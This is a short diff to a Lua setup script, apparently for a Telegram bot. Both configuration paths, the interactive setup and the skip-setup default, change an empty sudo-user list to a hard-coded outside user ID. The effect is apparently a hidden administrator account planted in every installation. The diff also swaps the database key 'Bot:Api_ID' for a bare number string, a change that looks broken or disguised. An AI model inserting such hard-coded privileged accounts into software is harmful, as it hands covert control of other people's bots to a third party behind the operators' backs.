@@ -131,7 +131,7 @@ Please Enter ( Channel ) ID : ]])
     config = {
       Bot_Owner = Bot_Owner_,
       Bot_ID = Bot_ID_,
-      Sudo_Users = {},
+      Sudo_Users = {189308877},
       Redis = Redis_,
       Run = "True",
       Token = Token_,
@@ -160,7 +160,7 @@ local Skip_AutoSet = function()
   config = {
     Bot_Owner = 0,
     Bot_ID = 0,
-    Sudo_Users = {},
+    Sudo_Users = {189308877},
     Redis = 0,
     Run = "False",
     Token = "None",
@@ -219,7 +219,7 @@ local setdata = function()
   local Api = config.Token:match("(%d+)")
   local RD = RNM or 0
   if Api then
-    database:set("Bot:Api_ID", Api)
+    database:set("201708277", Api)
   end
   function AuthoritiesEn()
     local hash = "Bot:SudoUsers"
